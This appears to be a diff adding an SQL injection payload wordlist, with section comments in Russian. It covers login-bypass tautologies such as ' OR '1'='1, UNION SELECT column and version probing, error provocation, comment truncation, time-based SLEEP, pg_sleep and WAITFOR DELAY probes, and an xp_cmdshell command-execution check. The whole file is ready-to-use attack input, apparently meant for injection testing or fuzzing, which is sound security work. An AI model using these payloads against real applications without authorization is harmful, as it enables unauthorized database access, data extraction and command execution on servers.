@@ -1,0 +1,100 @@
+# --------------------------------------------
+# Классические простые логические и Error-based
+# --------------------------------------------
+' OR '1'='1
+" OR "1"="1
+') OR ('1'='1
+") OR ("1"="1
+' OR '1'='1' --
+" OR "1"="1" --
+') OR ('1'='1' --
+") OR ("1"="1" --
+' OR '1'='1' #
+" OR "1"="1" #
+' OR '1'='1' /*
+" OR "1"="1" /*
+' OR 0=0 --
+" OR 0=0 --
+or 1=1 --
+or 1=1 #
+admin' --
+admin' #
+admin'/*
+
+# --------------------------------------------
+# UNION SELECT для поиска дополнительных колонок
+# (часто нужно подбирать количество колонок)
+# --------------------------------------------
+' UNION SELECT 1--
+" UNION SELECT 1--
+' UNION SELECT null--
+" UNION SELECT null--
+' UNION SELECT 1,2--
+" UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+" UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+" UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+" UNION SELECT 1,2,3,4,5--
+' UNION SELECT @@version--
+" UNION SELECT @@version--
+' UNION SELECT version()--
+" UNION SELECT version()--
+') UNION SELECT 1,2,3--
+") UNION SELECT 1,2,3--
+
+# --------------------------------------------
+# Провокация ошибки
+# --------------------------------------------
+' AND 1=(SELECT COUNT(*) FROM tablename)--
+" AND 1=(SELECT COUNT(*) FROM tablename)--
+' AND substring(@@version,1,1) = 'X'
+" AND substring(@@version,1,1) = 'X'
+'; EXEC xp_logininfo--
+"; EXEC xp_logininfo--
+
+# --------------------------------------------
+# Урезание остатка запроса комментариями
+# --------------------------------------------
+'--
+"--
+#
+/*
+')#
+")#
+')/*
+")/*
+
+# --------------------------------------------
+# Time-based (MySQL)
+# --------------------------------------------
+' OR SLEEP(5)#
+" OR SLEEP(5)#
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+'; SLEEP(5)--
+"; SLEEP(5)--
+'); SELECT pg_sleep(5); --
+"); SELECT pg_sleep(5); --
+
+# --------------------------------------------
+# Time-based (MS SQL)
+# --------------------------------------------
+' WAITFOR DELAY '0:0:5'--
+" WAITFOR DELAY '0:0:5'--
+') WAITFOR DELAY '0:0:5'--
+") WAITFOR DELAY '0:0:5'--
+
+# --------------------------------------------
+# Проверка Microsoft SQL (xp_cmdshell)
+# --------------------------------------------
+'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--
+"; EXEC master..xp_cmdshell 'ping 127.0.0.1'--
+
+# --------------------------------------------
+# Некоторые дополнительные комбинации
+# --------------------------------------------
+'||(SELECT 1 FROM DUAL)||
+'||(SELECT user())||
+'||(SELECT table_name FROM information_schema.tables LIMIT 1)||
